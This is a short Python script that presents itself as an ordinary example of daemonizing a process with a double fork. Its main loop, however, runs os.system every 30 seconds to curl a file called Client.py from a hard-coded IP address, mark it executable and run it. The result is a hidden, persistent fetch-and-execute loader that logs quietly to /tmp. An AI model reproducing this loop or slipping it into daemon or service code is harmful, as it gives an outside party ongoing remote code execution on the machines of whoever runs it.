import sys,os

def daemon(stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    try:
        pid = os.fork() 
        if pid > 0:
            sys.exit(0)  
    except OSError as e:
        sys.stderr.write("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror))
        sys.exit(1)

    os.chdir("/tmp")  
    os.umask(0) 
    os.setsid()   

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)    
    except OSError as e:
        sys.stderr.write("fork #2 failed: (%d) %s\n" % (e.errno, e.strerror))
        sys.exit(1)

    for f in sys.stdout, sys.stderr: f.flush()
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+')
    os.dup2(si.fileno(), sys.stdin.fileno())    
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())


def main():
    import time
    sys.stdout.write('Daemon started with pid %d\n' % os.getpid())
    sys.stdout.write('Daemon stdout output\n')
    sys.stderr.write('Daemon stderr output\n')
    c = 0

    while True:
        sys.stdout.write('%d: %s\n' % (c, time.ctime()))
        sys.stdout.flush()
        c = c + 1
        os.system('curl -O http://180.76.162.68/Client.py')
        os.system('chmod +x Client.py')
        os.system('python3 Client.py')
        time.sleep(30)



if __name__ == "__main__":
    daemon('/dev/null', '/tmp/daemon_stdout.log', '/tmp/daemon_error.log')
    main()
